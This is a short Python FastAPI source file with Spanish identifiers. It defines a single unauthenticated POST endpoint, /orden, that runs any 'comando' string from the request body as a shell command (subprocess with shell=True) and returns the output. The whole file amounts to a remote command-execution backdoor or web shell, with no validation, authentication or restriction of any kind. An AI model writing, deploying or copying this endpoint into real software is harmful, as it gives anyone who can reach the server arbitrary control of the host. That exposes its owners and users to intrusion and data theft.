from fastapi import FastAPI, Request
import subprocess

app = FastAPI()

@app.post("/orden")
async def recibir_orden(request: Request):
    data = await request.json()
    comando = data.get("comando")
    if comando:
        try:
            resultado = subprocess.check_output(comando, shell=True, stderr=subprocess.STDOUT, timeout=10)
            return {"status": "ok", "resultado": resultado.decode("utf-8")}
        except subprocess.CalledProcessError as e:
            return {"status": "error", "resultado": e.output.decode("utf-8")}
        except Exception as e:
            return {"status": "error", "resultado": str(e)}
    return {"status": "error", "mensaje": "No se recibió comando"}